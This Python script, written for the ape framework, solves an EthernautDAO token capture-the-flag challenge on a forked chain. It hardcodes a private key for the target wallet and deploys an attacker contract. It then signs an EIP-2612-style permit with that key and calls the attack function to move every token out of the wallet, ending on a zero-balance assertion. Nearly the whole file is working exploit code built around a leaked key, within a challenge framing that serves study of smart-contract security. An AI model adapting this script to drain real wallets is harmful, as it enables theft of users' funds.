from ape import accounts, project, Contract
from .utils.helper import w3, fork, get_block, get_timestamp

BLOCK = 7318910
ETHERNAUTDAO_TOKEN_CONTRACT = "0xF3Cfa05F1eD0F5eB7A8080f1109Ad7E424902121"
WALLET_PRIVATE_KEY = (
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
)


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contract and Wallet ---\n")
    token = Contract(ETHERNAUTDAO_TOKEN_CONTRACT)
    wallet = w3.eth.account.from_key(WALLET_PRIVATE_KEY)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    attacker_contract = project.EthernautDaoTokenAttacker.deploy(
        token.address,
        wallet.address,
        sender=attacker,
        # max_fee="100 gwei",
    )
    deadline = get_timestamp() * 2
    wallet_balance = token.balanceOf(wallet.address)
    permit_hash = attacker_contract.get_permit_hash(deadline, wallet_balance)
    signature = wallet.signHash(permit_hash)
    attacker_contract.attack(
        deadline,
        wallet_balance,
        signature.v,
        signature.r.to_bytes(32, byteorder="big"),
        signature.s.to_bytes(32, byteorder="big"),
        sender=attacker,
    )

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You have transfered the tokens out of the wallet ---\n")

    assert token.balanceOf(wallet.address) == 0

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
